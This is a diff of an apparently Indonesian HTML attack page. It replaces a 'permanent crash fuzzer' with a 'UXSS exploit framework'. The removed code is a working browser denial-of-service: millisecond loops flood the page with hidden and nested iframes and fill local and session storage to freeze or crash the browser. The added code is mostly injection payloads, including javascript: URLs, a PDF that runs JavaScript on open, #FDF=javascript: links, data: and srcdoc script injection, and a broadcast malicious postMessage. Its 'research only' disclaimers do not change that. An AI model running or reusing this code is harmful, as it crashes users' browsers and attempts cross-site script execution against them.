@@ -3,557 +3,371 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VECTOR 16 - PERMANENT CRASH FUZZER</title>
-
+<title>VECTOR 16 - UXSS Universal XSS Exploit</title>
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:monospace;
-}
-
-body{
-    background:#050505;
-    color:#00ffaa;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    padding:20px;
-    animation: bgFlash 0.05s infinite;
-}
-
-@keyframes bgFlash {
-    0% { background: #050505; }
-    100% { background: #1a0000; }
-}
-
-.container{
-    width:100%;
-    max-width:900px;
-    background:#111;
-    border:2px solid #ff3b30;
-    border-radius:18px;
-    padding:20px;
-    box-shadow:0 0 35px rgba(255,59,48,0.5);
-    animation: borderPulse 0.08s infinite alternate;
-}
-
-@keyframes borderPulse {
-    from { box-shadow: 0 0 20px rgba(255,59,48,0.3); }
-    to { box-shadow: 0 0 60px rgba(255,0,0,0.9); }
-}
-
-h1{
-    text-align:center;
-    color:#ff3b30;
-    margin-bottom:10px;
-    text-shadow:0 0 15px #ff0000;
-    font-size:26px;
-    animation: textShake 0.03s infinite;
-}
-
-@keyframes textShake {
-    0% { transform: translateX(0); }
-    25% { transform: translateX(1px); }
-    75% { transform: translateX(-1px); }
-}
-
-.desc{
-    text-align:center;
-    color:#ff4444;
-    margin-bottom:20px;
-    font-size:13px;
-    font-weight:bold;
-}
-
-.instructions{
-    background:#1a0000;
-    border:1px solid #ff0000;
-    padding:12px;
-    border-radius:10px;
-    margin-bottom:20px;
-    font-size:12px;
-    line-height:1.7;
-    color:#ff8888;
-}
-
-.instructions b{
-    color:#ff0000;
-    font-size:14px;
-}
-
-.stats{
-    display:flex;
-    gap:10px;
-    margin-bottom:20px;
-    flex-wrap:wrap;
-}
-
-.card{
-    flex:1;
-    min-width:120px;
-    background:#0a0000;
-    border:1px solid #ff0000;
-    border-radius:10px;
-    padding:10px;
-    text-align:center;
-}
-
-.card h2{
-    color:#ff0000;
-    font-size:24px;
-}
-
-.card span{
-    font-size:11px;
-    color:#ff6666;
-}
-
-.btn-group{
-    display:flex;
-    gap:10px;
-    margin-bottom:20px;
-}
-
-button{
-    flex:1;
-    padding:14px;
-    border:none;
-    border-radius:12px;
-    background:#ff3b30;
-    color:white;
-    font-weight:bold;
-    cursor:pointer;
-    transition:.1s;
-    font-size:16px;
-}
-
-button:hover{
-    background:#ff0000;
-    transform:scale(1.02);
-    box-shadow:0 0 20px red;
-}
-
-.log{
-    height:250px;
-    overflow:auto;
-    background:#000000;
-    border:1px solid #ff0000;
-    border-radius:10px;
-    padding:10px;
-    font-size:10px;
-}
-
-.entry{
-    margin-bottom:3px;
-    border-left:3px solid #ff0000;
-    padding-left:8px;
-    word-break:break-all;
-}
-
-.success{
-    color:#ff4444;
-    border-left-color:#ff0000;
-}
-
-.crash{
-    color:#ff0000;
-    font-weight:bold;
-    text-shadow:0 0 3px red;
-}
-
-.progress-bar{
-    width:100%;
-    height:3px;
-    background:#330000;
-    border-radius:2px;
-    margin:10px 0;
-    overflow:hidden;
-}
-
-.progress-fill{
-    width:0%;
-    height:100%;
-    background:#ff0000;
-    transition:width 0.01s linear;
-}
-
-.status-brutal{
-    position:fixed;
-    bottom:10px;
-    left:10px;
-    background:#1a0000;
-    border:1px solid red;
-    padding:6px 12px;
-    border-radius:8px;
-    font-size:9px;
-    color:#ff6666;
-    z-index:9999;
-    font-family:monospace;
-}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
+body{background:#0a0a0a;color:#00ff00;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
+.container{width:100%;max-width:1000px;background:#111;border:2px solid #ff3b30;border-radius:18px;padding:20px;box-shadow:0 0 40px rgba(255,59,48,0.3);}
+h1{text-align:center;color:#ff3b30;text-shadow:0 0 10px #ff3b30;margin-bottom:10px;}
+.warning{background:#1a0000;border:1px solid #ff3b30;padding:15px;border-radius:10px;margin:15px 0;color:#ff8888;font-size:12px;}
+.warning b{color:#ff0000;}
+.exploit-box{background:#0a0a0a;border:1px solid #00ff00;border-radius:10px;padding:15px;margin:15px 0;}
+.exploit-box h3{color:#00ff00;margin-bottom:10px;}
+.exploit-btn{background:#ff3b30;color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;margin:5px;font-weight:bold;}
+.exploit-btn:hover{background:#00ff00;color:#000;}
+.code{background:#1a1a1a;padding:10px;border-radius:8px;font-size:11px;overflow-x:auto;margin:10px 0;color:#ffaa00;}
+.status{position:fixed;bottom:10px;left:10px;background:#000;border:1px solid #ff3b30;padding:5px 10px;border-radius:5px;font-size:10px;z-index:9999;}
+.log{height:200px;overflow:auto;background:#000;border:1px solid #ff3b30;border-radius:10px;padding:10px;font-size:11px;margin-top:15px;}
+.entry{border-left:3px solid #ff3b30;padding-left:8px;margin-bottom:5px;word-break:break-all;}
+.success{color:#00ff00;border-left-color:#00ff00;}
 </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>💀 VECTOR 16 - PERMANENT CRASH 💀</h1>
-    <div class="desc">
-        ⚡ INFINITE PROTOCOL FUZZER | NO WINDOWS | PURE MEMORY KILLER ⚡
+    <h1>💀 VECTOR 16 - UXSS EXPLOIT FRAMEWORK 💀</h1>
+    
+    <div class="warning">
+        <b>⚠️ UNIVERSAL XSS (UXSS) EXPLOIT DEMO ⚠️</b><br><br>
+        UXSS menyerang <b>BROWSER / EXTENSION</b> bukan website.<br>
+        Jika berhasil, kode bisa dieksekusi di <b>DOMAIN MANAPUN</b> (Google, Facebook, dll)<br>
+        <span style="color:#ff0000;">🔒 UNTUK RESEARCH & EDUCATIONAL PURPOSE ONLY 🔒</span>
     </div>
 
-    <div class="instructions">
-        <b>🔥 PERINGATAN EXTREME 🔥</b><br><br>
-        1. Klik <b style="color:#ff0000">"💀 RUN PERMANENT FUZZER 💀"</b><br>
-        2. <b>FUZZER AKAN BERJALAN SELAMANYA (INFINITE LOOP)</b><br>
-        3. <b>TIDAK ADA SPAM WINDOW</b> - murni fuzzing protocol<br>
-        4. Browser akan <b>CRASH / MEMORY FULL / FREEZE TOTAL</b><br>
-        5. <b>RATUSAN IFRAME PER DETIK - TIDAK AKAN BERHENTI</b><br>
-        <span style="color:#ff0000; display:block; margin-top:8px;">⚠️ CLICK = BROWSER DESTROY ⚠️</span>
+    <div class="exploit-box">
+        <h3>🔥 UXSS VECTOR 1: javascript: Pseudo-protocol Injection</h3>
+        <button class="exploit-btn" onclick="uxss_javascriptProtocol()">▶ Inject JS ke current origin</button>
+        <button class="exploit-btn" onclick="uxss_iframeJS()">▶ Inject via iframe javascript:</button>
+        <div class="code">// Exploit: javascript:alert(document.cookie)</div>
     </div>
 
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
+    <div class="exploit-box">
+        <h3>📄 UXSS VECTOR 2: PDF Plugin UXSS (Acrobat Style)</h3>
+        <button class="exploit-btn" onclick="uxss_pdfPlugin()">▶ Try PDF #FDF=javascript:</button>
+        <button class="exploit-btn" onclick="uxss_pdfData()">▶ PDF data: URI + JS</button>
+        <div class="code">// Classic: https://example.com/test.pdf#FDF=javascript:alert(1)</div>
     </div>
 
-    <div class="stats">
-        <div class="card">
-            <h2 id="count">0</h2>
-            <span>Protocols Injected</span>
-        </div>
-        <div class="card">
-            <h2 id="iframeCount">0</h2>
-            <span>Active Iframes</span>
-        </div>
-        <div class="card">
-            <h2 id="active">💀 READY</h2>
-            <span>Status</span>
-        </div>
+    <div class="exploit-box">
+        <h3>🖼️ UXSS VECTOR 3: Image Download UXSS (Chromium 2021)</h3>
+        <button class="exploit-btn" onclick="uxss_imageDownload()">▶ Trigger via image download</button>
+        <button class="exploit-btn" onclick="uxss_imageFrame()">▶ Cross-frame image UXSS</button>
+        <div class="code">// CVE-2021-21125: ImageFetchTabHelper GetImageDataByJs</div>
     </div>
 
-    <div class="btn-group">
-        <button id="brutalBtn" onclick="startPermanentFuzzer()">
-            💀 RUN PERMANENT FUZZER 💀
-        </button>
+    <div class="exploit-box">
+        <h3>🔧 UXSS VECTOR 4: Extension-Based UXSS</h3>
+        <button class="exploit-btn" onclick="uxss_extensionCheck()">▶ Check vulnerable extensions</button>
+        <button class="exploit-btn" onclick="uxss_chromeExtension()">▶ Chrome Extension UXSS</button>
+        <div class="code">// Test for Adobe Acrobat, PDF.js, etc vulnerabilities</div>
+    </div>
+
+    <div class="exploit-box">
+        <h3>🌐 UXSS VECTOR 5: Cross-Origin Iframe Injection</h3>
+        <button class="exploit-btn" onclick="uxss_crossOriginIframe()">▶ Inject to Google iframe</button>
+        <button class="exploit-btn" onclick="uxss_postMessage()">▶ postMessage UXSS</button>
+        <div class="code">// Memanfaatkan postMessage + eval gadget</div>
     </div>
 
     <div class="log" id="log"></div>
 </div>
 
-<div class="status-brutal" id="statusBar">
-    💀 FUZZER: IDLE | Click RUN to destroy browser
-</div>
+<div class="status" id="status">💀 UXSS FRAMEWORK READY | RESEARCH MODE</div>
 
 <script>
-let generated = 0;
-let isRunning = false;
-let activeIframes = [];
-let fuzzerIntervals = [];
-let lastRateTime = 0;
-let rateCounter = 0;
+let logCount = 0;
 
-function addLog(msg, type = "") {
+function addLog(msg, type="") {
     const log = document.getElementById("log");
-    if (!log) return;
     const div = document.createElement("div");
     div.className = "entry " + type;
     div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
     log.appendChild(div);
     log.scrollTop = log.scrollHeight;
-    
-    // Limit log biar DOM gak overload
-    while (log.children.length > 600) {
-        log.removeChild(log.firstChild);
-    }
+    while(log.children.length > 200) log.removeChild(log.firstChild);
 }
 
-function updateStats() {
-    document.getElementById("count").innerText = generated.toLocaleString();
-    document.getElementById("iframeCount").innerText = activeIframes.length.toLocaleString();
-    
-    // Update progress bar - infinity spinning
-    const progressFill = document.getElementById("progressFill");
-    if (progressFill && isRunning) {
-        let width = parseFloat(progressFill.style.width) || 0;
-        width = (width + 0.5) % 100;
-        progressFill.style.width = width + "%";
-    }
-}
-
-function randomString(len) {
-    let result = '';
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-    for (let i = 0; i < len; i++) {
-        result += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return result;
-}
-
-function randomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-// BRUTAL PROTOCOL GENERATOR - BIKIN IFRAME GILA
-function generateBrutalProtocol() {
-    // Karakter random yang lebih brutal
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789+-._~!*()[]{}|\\';
-    let protocol = '';
-    const protoLen = randomInt(3, 25);
-    for (let j = 0; j < protoLen; j++) {
-        protocol += chars[Math.floor(Math.random() * chars.length)];
-    }
-    
-    // Domain random panjang
-    const tlds = ['com', 'net', 'org', 'xyz', 'io', 'tech', 'info', 'online', 'site', 'web', 'club', 'store', 'xyz', 'top', 'loan'];
-    const domain = randomString(randomInt(8, 35)) + '.' + tlds[Math.floor(Math.random() * tlds.length)];
-    const path = '/' + randomString(randomInt(5, 30)) + '/' + randomString(randomInt(3, 20));
-    const query = '?id=' + Date.now() + '_' + Math.random() + '&' + randomString(10) + '=' + randomString(15);
-    
-    const fullUrl = `${protocol}://${domain}${path}${query}`;
-    
-    // Bikin iframe super ringan tapi banyak
-    const iframe = document.createElement('iframe');
-    iframe.src = fullUrl;
-    iframe.style.display = 'none';
-    iframe.style.width = '0';
-    iframe.style.height = '0';
-    iframe.style.opacity = '0';
-    iframe.setAttribute('sandbox', ''); // allow-same-origin biar lebih berat
-    
-    document.body.appendChild(iframe);
-    activeIframes.push(iframe);
-    generated++;
-    
-    return iframe;
-}
-
-// PARTIAL CLEANUP - TAPI CUMA DIKIT BIAR MEMORY LEAK
-function brutalPartialCleanup() {
-    // Cuma bersihin 10% dari iframe - sisanya biar numpuk
-    const toRemove = Math.floor(activeIframes.length * 0.08);
-    for (let i = 0; i < toRemove && activeIframes.length > 0; i++) {
-        const iframe = activeIframes.shift();
-        try { 
-            iframe.remove(); 
-        } catch(e) {}
-    }
-}
-
-// FUNCTION UNTUK CRASH BROWSER - INFINITE GENERATION
-async function startPermanentFuzzer() {
-    if (isRunning) {
-        addLog("⚠️ FUZZER SUDAH BERJALAN! Browser akan crash...", "crash");
-        return;
-    }
-    
-    isRunning = true;
-    const brutalBtn = document.getElementById("brutalBtn");
-    brutalBtn.disabled = true;
-    brutalBtn.textContent = "💀 INFINITE LOOP ACTIVE 💀";
-    
-    // Reset
-    generated = 0;
-    activeIframes.forEach(iframe => { try { iframe.remove(); } catch(e) {} });
-    activeIframes = [];
-    
-    addLog("══════════════════════════════════════════════════", "crash");
-    addLog("💀💀💀 PERMANENT INFINITE FUZZER STARTED 💀💀💀", "crash");
-    addLog("💀 FUZZER AKAN BERJALAN SELAMANYA (TIDAK BERHENTI)", "crash");
-    addLog("💀 TANPA SPAM WINDOW - MURNI PROTOCOL FLOOD", "crash");
-    addLog("💀 BROWSER WILL CRASH - MEMORY LEAK ACTIVE", "crash");
-    addLog("══════════════════════════════════════════════════", "crash");
-    
-    document.getElementById("active").innerHTML = "💀 INFINITE";
-    document.getElementById("active").style.color = "#ff0000";
-    
-    const statusBar = document.getElementById("statusBar");
-    statusBar.innerHTML = "💀 FUZZER: ACTIVE - MEMORY LEAK IN PROGRESS 💀";
-    statusBar.style.background = "#ff000022";
-    statusBar.style.border = "2px solid red";
-    
-    updateStats();
-    
-    // ============ INFINITE LOOP #1 - SUPER FAST GENERATOR ============
-    // Setiap 1ms generate multiple iframes - Paling Brutal
-    const fastGenerator = setInterval(() => {
-        if (!isRunning) return;
-        
-        // Generate 8-25 iframes per interval
-        const batchSize = randomInt(10, 30);
-        for (let i = 0; i < batchSize; i++) {
-            generateBrutalProtocol();
-        }
-        
-        // Hitung rate per detik
-        rateCounter += batchSize;
-        const now = Date.now();
-        if (now - lastRateTime >= 1000) {
-            const rate = rateCounter;
-            addLog(`⚡ [RATE] ${rate} protocols/second | Total: ${generated.toLocaleString()}`, "crash");
-            document.getElementById("active").innerHTML = `💀 ${rate}/s`;
-            rateCounter = 0;
-            lastRateTime = now;
-        }
-        
-        updateStats();
-        
-        // Partial cleanup - tapi dikit biar memory leak
-        if (activeIframes.length > 8000) {
-            brutalPartialCleanup();
-        }
-    }, 1); // SETIAP 1 MILIDETIK - SUPER BRUTAL!
-    
-    // ============ INFINITE LOOP #2 - HEAVY IFRAME (SRC PANJANG) ============
-    const heavyGenerator = setInterval(() => {
-        if (!isRunning) return;
-        
-        // Generate iframe dengan URL super panjang (bikin memory berat)
-        const superLongProtocol = 'x' + randomString(50) + randomString(30) + 'y' + randomString(40);
-        const superLongDomain = randomString(60) + '.' + randomString(15) + '.com';
-        const superLongPath = '/' + randomString(100) + '/' + randomString(80);
-        
-        const heavyIframe = document.createElement('iframe');
-        heavyIframe.src = `${superLongProtocol}://${superLongDomain}${superLongPath}?${randomString(200)}`;
-        heavyIframe.style.display = 'none';
-        document.body.appendChild(heavyIframe);
-        activeIframes.push(heavyIframe);
-        generated++;
-        updateStats();
-    }, 5);
-    
-    // ============ INFINITE LOOP #3 - NESTED IFRAME ============
-    const nestedGenerator = setInterval(() => {
-        if (!isRunning) return;
-        
-        // Bikin iframe yang di dalemnya ada iframe lagi (nested)
-        const outerIframe = document.createElement('iframe');
-        outerIframe.style.display = 'none';
-        outerIframe.srcdoc = '<iframe src="' + randomString(20) + '://' + randomString(15) + '.com"></iframe>';
-        document.body.appendChild(outerIframe);
-        activeIframes.push(outerIframe);
-        generated++;
-        updateStats();
-    }, 8);
-    
-    // ============ INFINITE LOOP #4 - DOM CLUTTER (Bikin element random) ============
-    const domClutter = setInterval(() => {
-        if (!isRunning) return;
-        
-        // Bikin div random dengan konten besar
-        const clutter = document.createElement('div');
-        clutter.style.position = 'absolute';
-        clutter.style.left = '-9999px';
-        clutter.style.top = '-9999px';
-        clutter.innerHTML = '<br>'.repeat(randomInt(100, 500)) + randomString(2000);
-        document.body.appendChild(clutter);
-        
-        // Hapus setelah 50ms biar gak infinite, tapi tetep bikin berat
-        setTimeout(() => {
-            try { clutter.remove(); } catch(e) {}
-        }, 50);
-    }, 3);
-    
-    // ============ INFINITE LOOP #5 - STYLE & SCRIPT INJECTION ============
-    const styleSpam = setInterval(() => {
-        if (!isRunning) return;
-        
-        // Inject style random
-        const style = document.createElement('style');
-        style.textContent = `div${Math.random()}{position:absolute;top:${Math.random()*10000}px;left:${Math.random()*10000}px;width:${Math.random()*5000}px;height:${Math.random()*5000}px;background:rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});}`;
-        document.head.appendChild(style);
-        
-        setTimeout(() => {
-            try { style.remove(); } catch(e) {}
-        }, 30);
-    }, 4);
-    
-    // ============ INFINITE LOOP #6 - LOCALSTORAGE SPAM ============
-    const storageSpam = setInterval(() => {
-        if (!isRunning) return;
+// ============ UXSS VECTOR 1: javascript: Protocol ============
+function uxss_javascriptProtocol() {
+    addLog("🔥 [UXSS-V1] Mencoba javascript: protocol injection...", "");
+    const jsCode = prompt("Masukkan JavaScript code untuk di-execute:", "alert('UXSS! Domain: '+document.domain)");
+    if(jsCode) {
+        const url = "javascript:" + jsCode;
+        addLog(`🚀 Executing: ${url.substring(0, 80)}...`, "success");
         try {
-            for (let i = 0; i < 20; i++) {
-                localStorage.setItem(`fuzz_${Date.now()}_${i}_${Math.random()}`, randomString(500));
-            }
+            const win = window.open(url, "_blank");
+            if(!win) addLog("⚠️ Popup blocked! Coba izinkan popup", "");
+        } catch(e) { addLog(`Error: ${e.message}`, ""); }
+    }
+}
+
+function uxss_iframeJS() {
+    addLog("📦 [UXSS-V1] Inject via iframe javascript: protocol", "");
+    const jsCode = prompt("JS code untuk di-inject:", "alert('UXSS from iframe: '+document.domain)");
+    if(jsCode) {
+        const iframe = document.createElement('iframe');
+        iframe.src = "javascript:" + jsCode;
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+        addLog(`✅ Iframe injected with: ${jsCode.substring(0, 50)}...`, "success");
+        setTimeout(() => iframe.remove(), 1000);
+    }
+}
+
+// ============ UXSS VECTOR 2: PDF Plugin ============
+function uxss_pdfPlugin() {
+    addLog("📄 [UXSS-V2] Testing PDF plugin UXSS (#FDF parameter)", "");
+    const pdfUrl = prompt("Masukkan URL PDF (kosong untuk demo):", "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf");
+    if(pdfUrl) {
+        const jsCode = prompt("JS code untuk execute via #FDF:", "alert('PDF UXSS! Domain: '+document.domain)");
+        if(jsCode) {
+            const exploitUrl = pdfUrl + "#FDF=javascript:" + encodeURIComponent(jsCode);
+            addLog(`🚀 Opening: ${exploitUrl.substring(0, 100)}...`, "success");
+            window.open(exploitUrl, "_blank");
+        }
+    } else {
+        // Demo dengan data: URI PDF
+        const fakePdf = "data:application/pdf,%PDF-1.4%0A%1%0Aendstream";
+        addLog("Demo: Membuka PDF dengan parameter FDF", "");
+        window.open(fakePdf + "#FDF=javascript:alert('UXSS via PDF!')", "_blank");
+    }
+}
+
+function uxss_pdfData() {
+    addLog("📄 [UXSS-V2] PDF data: URI + JavaScript execution", "");
+    // PDF minimal dengan JavaScript action
+    const pdfJS = `%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Outlines 2 0 R /Pages 3 0 R /OpenAction << /S /JavaScript /JS (app.alert('UXSS!')) >> >>
+endobj
+2 0 obj
+<< /Type /Outlines >>
+endobj
+3 0 obj
+<< /Type /Pages /Kids [4 0 R] /Count 1 >>
+endobj
+4 0 obj
+<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] >>
+endobj
+xref
+0 5
+0000000000 65535 f 
+0000000015 00000 n 
+0000000090 00000 n 
+0000000119 00000 n 
+0000000173 00000 n 
+trailer
+<< /Size 5 /Root 1 0 R >>
+startxref
+242
+%%EOF`;
+    
+    const pdfDataUri = "data:application/pdf;base64," + btoa(pdfJS);
+    addLog("Membuka PDF dengan JavaScript auto-execute...", "success");
+    window.open(pdfDataUri, "_blank");
+}
+
+// ============ UXSS VECTOR 3: Image Download UXSS ============
+function uxss_imageDownload() {
+    addLog("🖼️ [UXSS-V3] Testing ImageFetchTabHelper UXSS (CVE-2021-21125)", "");
+    addLog("⚠️ Vulnerability ini sudah di-patch di Chrome versi terbaru", "");
+    
+    // Simulasi: buat iframe dengan image yang punya filename malicious
+    const maliciousFilename = "'+alert('UXSS on: '+document.domain)+'";
+    const img = document.createElement('img');
+    img.src = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png";
+    img.style.display = 'none';
+    document.body.appendChild(img);
+    
+    addLog(`Testing with filename: ${maliciousFilename}`, "");
+    addLog("Jika vulnerable, alert akan muncul di domain Google", "");
+    
+    // Simulasi trigger (tidak akan work di Chrome modern)
+    const testFrame = document.createElement('iframe');
+    testFrame.src = "https://www.google.com";
+    testFrame.style.display = 'none';
+    document.body.appendChild(testFrame);
+    
+    setTimeout(() => {
+        try {
+            addLog("Checking iframe content... (typically blocked by CORS)", "");
         } catch(e) {
-            // LocalStorage penuh - tanda crash mendekat
-            addLog("💀 LOCALSTORAGE FULL - CRASH IMMINENT", "crash");
+            addLog(`CORS blocked: ${e.message} - Browser aman`, "");
         }
-    }, 50);
+        testFrame.remove();
+        img.remove();
+    }, 2000);
+}
+
+function uxss_imageFrame() {
+    addLog("🖼️ [UXSS-V3] Cross-frame image download UXSS", "");
+    addLog("Membuat iframe ke target, lalu trigger image download...", "");
     
-    // ============ INFINITE LOOP #7 - SESSIONSTORAGE SPAM ============
-    const sessionSpam = setInterval(() => {
-        if (!isRunning) return;
-        try {
-            for (let i = 0; i < 15; i++) {
-                sessionStorage.setItem(`session_${Math.random()}`, randomString(300));
-            }
-        } catch(e) {}
-    }, 50);
+    const target = prompt("Target domain (contoh: https://www.google.com):", "https://www.google.com");
+    if(target) {
+        const iframe = document.createElement('iframe');
+        iframe.src = target;
+        iframe.style.width = "800px";
+        iframe.style.height = "400px";
+        iframe.style.border = "1px solid red";
+        iframe.style.marginTop = "10px";
+        document.body.appendChild(iframe);
+        
+        addLog(`Iframe ${target} loaded - coba right-click image lalu download`, "");
+        addLog("⚠️ Jika vulnerable, nama file malicious akan execute JS", "");
+        
+        setTimeout(() => {
+            iframe.remove();
+        }, 30000);
+    }
+}
+
+// ============ UXSS VECTOR 4: Extension ============
+function uxss_extensionCheck() {
+    addLog("🔧 [UXSS-V4] Checking for vulnerable extensions...", "");
     
-    // ============ INFINITE LOOP #8 - MUTATION OBSERVER FLOOD ============
-    let observerCount = 0;
-    const observerSpam = setInterval(() => {
-        if (!isRunning) return;
-        try {
-            const target = document.createElement('div');
-            document.body.appendChild(target);
-            const observer = new MutationObserver(() => {});
-            observer.observe(target, { attributes: true, childList: true, subtree: true });
-            observerCount++;
-            setTimeout(() => {
-                try { observer.disconnect(); target.remove(); } catch(e) {}
-            }, 100);
-        } catch(e) {}
-    }, 10);
-    
-    // ============ INFINITE LOOP #9 - AJAX/FETCH SPAM (optional) ============
-    const fetchSpam = setInterval(() => {
-        if (!isRunning) return;
-        try {
-            fetch('https://httpbin.org/delay/1').catch(() => {});
-        } catch(e) {}
-    }, 100);
-    
-    // Simpan semua interval
-    fuzzerIntervals = [
-        fastGenerator, heavyGenerator, nestedGenerator, domClutter,
-        styleSpam, storageSpam, sessionSpam, observerSpam, fetchSpam
+    // Cek apakah ada extension yang mungkin vulnerable
+    const extensions = [
+        { name: "Adobe Acrobat", test: "navigator.plugins['Adobe Acrobat']" },
+        { name: "PDF.js", test: "typeof PDFViewerApplication !== 'undefined'" },
+        { name: "Chrome PDF Viewer", test: "navigator.plugins['Chrome PDF Viewer']" }
     ];
     
-    // MONITOR - Update status bar setiap detik
-    const monitor = setInterval(() => {
-        if (!isRunning) return;
-        const statusBarDiv = document.getElementById("statusBar");
-        if (statusBarDiv) {
-            statusBarDiv.innerHTML = `💀 PROTOCOLS: ${generated.toLocaleString()} | IFRAMES: ${activeIframes.length} | RATE: ${rateCounter}/s | MEMORY LEAK 💀`;
+    extensions.forEach(ext => {
+        try {
+            const result = eval(ext.test);
+            if(result) {
+                addLog(`⚠️ DETECTED: ${ext.name} mungkin vulnerable`, "success");
+            } else {
+                addLog(`✅ ${ext.name}: tidak terdeteksi`, "");
+            }
+        } catch(e) {
+            addLog(`❌ Check ${ext.name} error`, "");
         }
-        
-        // Warning kritis
-        if (activeIframes.length > 15000) {
-            addLog("💀💀💀 CRITICAL: " + activeIframes.length + " ACTIVE IFRAMES - BROWSER WILL DIE SOON 💀💀💀", "crash");
-        }
-        
-        // Update judul tab biar makin serem
-        document.title = `💀 ${generated.toLocaleString()} PROTOCOLS - VECTOR 16 CRASH 💀`;
-    }, 1000);
-    fuzzerIntervals.push(monitor);
+    });
     
-    addLog("💀 INFINITE LOOP ACTIVE - BROWSER AKAN CRASH", "crash");
-    addLog("💀 TIDAK ADA SPAM WINDOW - MURNI PROTOCOL FLOOD", "crash");
-    addLog("💀 CLOSE BROWSER VIA TASK MANAGER UNTUK BERHENTI", "crash");
+    addLog("💡 UXSS via extension: Jika ada extension vulnerable, bisa inject JS ke any domain", "");
 }
 
-// Cleanup function (tapi gak akan kepanggil karena fuzzer gak berhenti)
-window.addEventListener('beforeunload', function() {
-    if (isRunning) {
-        return "VECTOR 16 fuzzer sedang berjalan. Browser mungkin crash.";
+function uxss_chromeExtension() {
+    addLog("🔧 [UXSS-V4] Chrome Extension UXSS simulation", "");
+    addLog("Mencoba komunikasi dengan extension via chrome.runtime", "");
+    
+    // Coba cek apakah ada extension yang listen ke message
+    try {
+        if(typeof chrome !== 'undefined' && chrome.runtime) {
+            addLog("chrome.runtime available - mungkin ada extension", "");
+            chrome.runtime.sendMessage({type: "UXSS_TEST", code: "alert(1)"}, (response) => {
+                if(response) addLog(`Extension response: ${response}`, "");
+            });
+        } else {
+            addLog("chrome.runtime tidak tersedia (bukan extension context)", "");
+        }
+    } catch(e) {
+        addLog(`Error: ${e.message}`, "");
+    }
+    
+    // Simulasi injection ke extension content script
+    addLog("⚠️ UXSS via extension membutuhkan vulnerable extension specifik", "");
+}
+
+// ============ UXSS VECTOR 5: Cross-Origin ============
+function uxss_crossOriginIframe() {
+    addLog("🌐 [UXSS-V5] Cross-origin iframe injection", "");
+    const target = prompt("Target domain untuk iframe:", "https://www.google.com");
+    
+    if(target) {
+        const iframe = document.createElement('iframe');
+        iframe.src = target;
+        iframe.id = "uxss_target";
+        iframe.style.width = "100%";
+        iframe.style.height = "300px";
+        iframe.style.border = "2px solid #ff3b30";
+        document.body.appendChild(iframe);
+        
+        addLog(`Iframe ${target} added - mencoba postMessage...`, "");
+        
+        setTimeout(() => {
+            try {
+                // Coba akses konten iframe (akan kena CORS)
+                const frameDoc = iframe.contentWindow.document;
+                addLog("CORS bypassed? Bisa akses konten!", "success");
+            } catch(e) {
+                addLog(`CORS blocked: ${e.message} - Tidak bisa akses langsung`, "");
+            }
+        }, 2000);
+    }
+}
+
+function uxss_postMessage() {
+    addLog("📨 [UXSS-V5] postMessage UXSS testing", "");
+    addLog("Mencari event listener yang vulnerable (eval gadget)", "");
+    
+    const maliciousMessage = {
+        type: "execute",
+        code: "alert('UXSS from postMessage! Domain: '+document.domain)"
+    };
+    
+    addLog(`Broadcasting malicious postMessage: ${JSON.stringify(maliciousMessage)}`, "");
+    
+    // Broadcast ke semua window
+    window.postMessage(maliciousMessage, "*");
+    addLog("Message sent - jika ada listener yang vulnerable, code akan execute", "");
+    
+    // Tambahkan listener untuk testing
+    window.addEventListener("message", (e) => {
+        if(e.data && e.data.code) {
+            addLog(`⚠️ Received message with code - JANGAN EVAL di production!`, "success");
+            // eval(e.data.code); // DANGEROUS - commented
+        }
+    });
+}
+
+// ============ ADDITIONAL UXSS TECHNIQUES ============
+function uxss_dataUri() {
+    addLog("💿 [UXSS] Data URI + base64 obfuscation", "");
+    const jsCode = prompt("JS code to encode:", "alert('UXSS via data:uri')");
+    if(jsCode) {
+        const dataUri = "data:text/html;base64," + btoa(`<script>${jsCode}</script>`);
+        addLog(`Opening: ${dataUri.substring(0, 80)}...`, "");
+        window.open(dataUri, "_blank");
+    }
+}
+
+function uxss_srcdoc() {
+    addLog("📄 [UXSS] iframe srcdoc injection", "");
+    const jsCode = prompt("JS code:", "alert('UXSS from srcdoc')");
+    if(jsCode) {
+        const iframe = document.createElement('iframe');
+        iframe.srcdoc = `<script>${jsCode}</script>`;
+        iframe.style.width = "300px";
+        iframe.style.height = "150px";
+        document.body.appendChild(iframe);
+        addLog("iframe srcdoc injected", "success");
+        setTimeout(() => iframe.remove(), 5000);
+    }
+}
+
+// ============ INFO PANEL ============
+addLog("💀 VECTOR 16 - UXSS EXPLOIT FRAMEWORK LOADED", "success");
+addLog("📖 UXSS: Universal Cross-Site Scripting - Browser-level exploit", "");
+addLog("⚠️ Untuk penelitian keamanan - Jangan gunakan untuk hacking", "");
+addLog("🔥 Teknik: javascript: protocol, PDF plugin, Image download, Extension", "");
+
+// Simulasi detect browser version
+const ua = navigator.userAgent;
+addLog(`🌐 Browser: ${ua.substring(0, 100)}...`, "");
+if(ua.includes("Chrome/")) {
+    const version = ua.match(/Chrome\/(\d+)/);
+    if(version) addLog(`Chrome version: ${version[1]} - UXSS patch status unknown`, "");
+}
+
+// Info additional
+document.addEventListener('keydown', (e) => {
+    if(e.ctrlKey && e.shiftKey && e.key === 'I') {
+        addLog("🔧 DevTools shortcut detected", "");
     }
 });
-
-addLog("💀 VECTOR 16 - PERMANENT CRASH FUZZER READY", "crash");
